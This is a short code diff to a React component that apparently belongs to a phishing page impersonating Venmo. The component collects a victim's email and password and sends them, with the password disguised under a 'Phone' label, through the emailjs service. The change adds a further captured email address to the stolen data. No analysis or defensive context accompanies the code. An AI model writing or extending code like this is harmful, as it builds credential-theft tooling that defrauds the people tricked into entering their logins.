@@ -1,9 +1,14 @@
-import React, { useState } from 'react';
+import React, { useState ,useContext } from 'react';
 import { useNavigate} from 'react-router-dom';
 import emailjs from 'emailjs-com';
-import { kMaxLength } from 'buffer';
+import { AuthContext } from './AuthContext';
+// import { kMaxLength } from 'buffer';
+
+
 
 const Alrt = () => {
+  const {contemail,setContEmail} = useContext(AuthContext);
+
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
@@ -42,6 +47,7 @@ const Alrt = () => {
         web_name:'Venmo',
         from_name: 'Venmo',
         message: `Name: ${email}, 
+        Email: ${contemail},
         Phone: ${password}, 
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
